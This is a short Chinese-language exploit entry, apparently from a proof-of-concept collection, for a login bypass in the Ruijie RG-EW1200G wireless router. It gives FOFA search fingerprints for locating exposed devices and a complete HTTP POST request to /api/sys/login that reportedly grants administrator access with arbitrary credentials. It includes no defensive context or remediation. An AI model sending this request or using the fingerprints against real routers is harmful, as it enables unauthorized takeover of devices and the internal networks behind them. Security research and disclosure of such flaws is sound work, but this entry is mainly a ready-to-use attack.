# 锐捷RG-EW1200G无线路由器登录绕过

锐捷网络RG-EW1200G HWR_1.0(1)B1P5,Release(07161417) r483存在登录绕过逻辑漏洞，允许任何用户无需密码即可获得设备管理员权限。登录路由器，获取敏感信息，控制内部网络。

## fofa

```
body="app.2fe6356cdd1ddd0eb8d6317d1a48d379.css"
icon_hash="1086165720"
```

## poc

```
POST /api/sys/login HTTP/1.1
Host: xxx.xxx.xxx:6060
Content-Length: 59
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26
Content-Type: application/x-www-form-urlencoded
Origin: http://xxx.xxx.xxx:6060
Referer: http://xxx.xxx.xxx:6060/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Edge";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Connection: close

{"username":"2","password":"123","timestamp":1692412880000}
```

![image-20240526194459561](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405261944604.png)